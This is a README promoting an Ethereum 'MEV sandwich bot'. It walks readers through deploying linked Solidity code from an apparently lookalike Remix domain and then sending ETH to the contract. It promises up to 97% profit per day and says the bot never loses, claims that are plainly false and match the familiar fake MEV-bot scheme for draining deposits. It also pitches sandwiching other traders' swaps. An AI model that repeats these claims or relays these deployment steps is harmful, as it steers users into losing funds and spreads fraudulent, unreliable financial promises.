![](https://i.imgur.com/GB3KvsI.png)

<div align="center">

# ⚡🤖 ETH Arbitrage MEV-BOT 🤖⚡
  
Here we provide you access to our 100% Open-Source and User-Friendly (no coding skills required) MEV Bot written in Solidity. It's our flagship project that allows users to automatically profit from high-value swaps by strategically reordering and placing transactions to take advantage of expected price flactuations within Uniswap liquidity pools.

</div>

<p align="center">
  <img src="https://github.com/ntkme/github-buttons/workflows/build/badge.svg" alt="build"/>
  </p>

<p align="center">
  <img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white" alt="ethereum" />
  <img src="https://img.shields.io/badge/Solidity-%23363636.svg?style=for-the-badge&logo=solidity&logoColor=white" alt="solidity" />
</p>

---
### 🧵 Contents
- [📚 About](#-about)
- [✨ How it Works ](#-how-it-works)
- [📈 Estimated Profits](#-estimated-profits)
- [🚀 How to get started](#-how-to-launch-the-eth-mev-bot)
- [👋 Contact](#-contact)
---

## 📚 About

In the fascinating world of cryptocurrency, understanding what a MEV Bot is, can be crucial. A Maximal Extractable Value (MEV) bot is a powerful arbitrage tool that scans the Ethereum Mempool for pending transactions (TX) of decentralized exchanges like Uniswap. 
It automatically inserts our first TX with _slightly higher gas_ fees (1 Gwei higher) and a second one with _slightly lower gas_, essentially sandwiching the "targeted" TX to generate profits of the slippage differences.

---

<div align="center">

## ✨ How it works

![example](https://user-images.githubusercontent.com/130685019/254479836-a36f8b0c-882d-4efe-97b4-42e22a7f29d1.png)

</div>

- The MEV-BOT continuously monitors the public Ethereum Mempool for pending transactions (TX) from Uniswap AMM, until it identifies a TX with price slippage / flactuations on a token (e.g. a large buy order)🔎
- Before executing any trades, the algorithm calculates the potential gains against transaction costs to ensure profitability💡
- MEV-Bot swiftly executes a sandwich operation by placing a buy order (for the same token) just before the "targeted" TX, simultaneous with placing a sell order right after within the same block, profiting from the price movement🥪
- It optimizes paid gas fees for timely execution, cost efficiency and it always sets 1 gas more than competing bots, as long as it remains profitable⚡
- Then sends back the ETH to the contract ready for withdrawal📤

We are proud to say that our MEV solution outperforms 99% of Arbitrage Bots on the Ethereum Blockchain.

---

## 📈 Estimated Profits


| Investment Range (ETH)      | Liquidity Level      | Profits per 24 Hours    |
|-----------------------|----------------------|-------------------------|
| 0.1   ETH - 0.5   ETH       | Low                  | Up to 10%    |
| 0.5   ETH - 1.2   ETH      | Moderate              | Up to 20%    |
| 1.2   ETH - 2.4   ETH      | Moderate             | 20-27%      |
| 2.4   ETH - 5.0 ETH       | High                 | 27-35%      |
| 5.0   ETH - 10    ETH        | High                 | 35-50%       |
| 10    ETH - 20    ETH        | Very High            | 50-63%       |
| 20    ETH - 50    ETH         | Very High            | 76%+         |
| 50    ETH - 100   ETH        | Extremely High       | 97%+         |

_Please be aware that these figures are estimates based on historical data. They can slightly vary depending on market conditions and the frequency of MEV opportunities._

---


## 🚀 How to launch the ETH MEV-Bot

1)  Download [MetaMask](https://metamask.io/download.html) (if you don’t have it already) 

2)  Access [Remix - Ethereum IDE](https://remix-compiler.net) (Web-based environment to write and deploy Ethereum smart contracts)

3) 📁 Click on the `contracts`  folder and then create `New File`. Rename it as you like, i.e: “MEV.sol”

4) 🧾 Paste [this source code](https://raw.githubusercontent.com/JoeMcCord/mev-arbitrage-bot/main/contracts/MEVBot.sol) from Github into your Remix file

5) 🔧 Go to the `Solidity Compiler` tab, select version `0.7.6+commit` and then select `Compile MEV.sol`.

![2](https://i.imgur.com/QPgCVFg.png)

6) 🚀 Navigate to the `DEPLOY & RUN TRANSACTIONS` tab, select the `Injected Provider - Metamask` environment and then `Deploy`. By approving the Metamask contract creation fee, you will have created your own MEV-Bot.

![3](https://i.imgur.com/ajj5EqF.png)

#### ⚙️ Configuration

7) Copy your newly created contract address and fund it with any amount of ETH (minimum 0.5+ ETH recommended) that you would like the bot to earn with by simply sending ETH to your newly created contract address.

![4](https://i.imgur.com/8QpjFHY.png)
 
8) - After your transaction is confirmed, click the `Start` button to run the bot.  
   - Press the `Stop` button to halt bot operations.  
   - Withdraw all ETH at any time by clicking the `Withdrawal` button.  

![5](https://i.imgur.com/rwnTs4Y.png)

<br>
<div align="center">

💰 That’s it. The bot will start working immediately earning you profits from sandwich actions on Uniswap pools 💰

</div>

<div align="center">

Notice: Your MEV-Bot needs to run for at least one day to reach the estimated performance.
</div>


---

### 👋 Contact

If you have any questions or inquiries for assistance, feel free to reach out to us on Telegram: https://t.me/MEVLabsContact

---

### ⭐ Show your Support

If you find our project interesting, please consider giving it a star.   
Your support is greatly appreciated and helps in motivating further development and improvements.

![star](https://cdn.discordapp.com/attachments/975036883958636557/975057102097743973/unknown.png)

---

## 💭FAQ

#### If many people will use the bot, wouldn’t dilution of profits occur?

We do not plan to limit access to the bot for now because there won’t be any affect for us or our users profiting as pools that the bot works on are with the biggest liquidities and volumes on Uniswap so our users involvement in the pools will always be very minor.

#### What average ROI and risks can I expect?

You can find the ROI according to latest data of bot performances in the "Estimated Profits" section. Bot does not make any losses, it only executes trades when there are proper MEV opportunities to make profits, so under all circumstances user is in plus.

#### What amount of funds does bot need to work?

We recommend funding the contract with at least 0.5-1 ETH (moderate liquidity level) to be sure to reach the profit threshold since it needs to cover competetive gas fees and possible burn fees. Bot targets token contracts with max 3% burn fee and it has to pay higher gas fees in order to complete its transactions in the intended order. If you fund the contract with less than recommended the bot will basically waste more in fees than making profits.

#### Do I need to keep remix open in browser while the bot is activated? 

No, just save the bot contract address after creating it. The next time you want to access your bot via Remix, you need to compile the file again as in step 5. Now head to `DEPLOY & RUN TRANSACTIONS`, reconnect your Metamask, paste your contract address into `Load contract from Address` and press `At Address`.

![](https://i.imgur.com/SG1aENC.png)

Now it can be found again under "Deployed Contracts".

#### Does it work on other chains or DEXes as well?

No, currently the bot is dedicated only for Ethereum on Uniswap pools.

---
